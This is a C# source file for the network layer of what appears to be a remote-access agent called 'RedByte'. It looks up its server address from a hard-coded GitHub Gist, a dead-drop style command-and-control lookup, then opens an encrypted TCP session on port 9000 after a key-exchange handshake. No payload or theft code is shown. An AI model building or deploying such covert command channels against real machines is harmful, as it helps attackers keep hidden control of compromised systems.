using System.Net.Sockets;
using System.Net.Http;
using NSec.Cryptography;

namespace RedByte.Agent.Network;

public class TcpClientManager
{
    private static TcpClientManager? _instance;
    private TcpClient _client;
    private NetworkStream _stream;
    private const int DefaultPort = 9000;
    private const string GitGistURL = "https://gist.githubusercontent.com/galshichrur/1b160c4a5451f18e2fd0e94b844657a5/raw/gistfile1.txt";

    public static TcpClientManager GetInstance()
    {
        if (_instance == null)
            _instance = new TcpClientManager();
        return _instance;
    }

    public async Task<bool> Connect()
    {
        try
        {
            _client = new TcpClient();
            await _client.ConnectAsync(GetServerIp(), DefaultPort);
            _stream = _client.GetStream();

            await StartSecureSession();
            return true;
        }
        catch
        {
            Disconnect();
            return false;
        }
    }

    public async Task Send(object data)
    {
        byte[] payload = Crypto.Encrypt(data);
        byte[] length = BitConverter.GetBytes(payload.Length);

        await _stream.WriteAsync(length);
        await _stream.WriteAsync(payload);
    }

    public async Task<T?> Receive<T>()
    {
        try
        {
            byte[] lengthBytes = await ReadExact(4);
            int length = BitConverter.ToInt32(lengthBytes);

            byte[] payload = await ReadExact(length);
            return Crypto.Decrypt<T>(payload);
        }
        catch
        {
            return default;
        }
    }

    private async Task<byte[]> ReadExact(int size)
    {
        byte[] buffer = new byte[size];
        int total = 0;

        while (total < size)
        {
            int read = await _stream.ReadAsync(buffer, total, size - total);
            if (read == 0) throw new Exception();
            total += read;
        }

        return buffer;
    }

    public void Disconnect()
    {
        Crypto.Clear();
        _stream?.Close();
        _client?.Close();
    }

    private async Task StartSecureSession()
    {
        byte[] publicKey = Crypto.CreatePublicKey(out Key privateKey);

        // Handshake: public_key(32 bytes)
        await _stream.WriteAsync(publicKey);
        byte[] serverPublicKey = await ReadExact(Crypto.PublicKeySize);

        Crypto.SetSharedKey(privateKey, serverPublicKey);
    }

    private string GetServerIp()
    {
        using var http = new HttpClient();
        return http.GetStringAsync(GitGistURL).Result.Trim();
    }
}
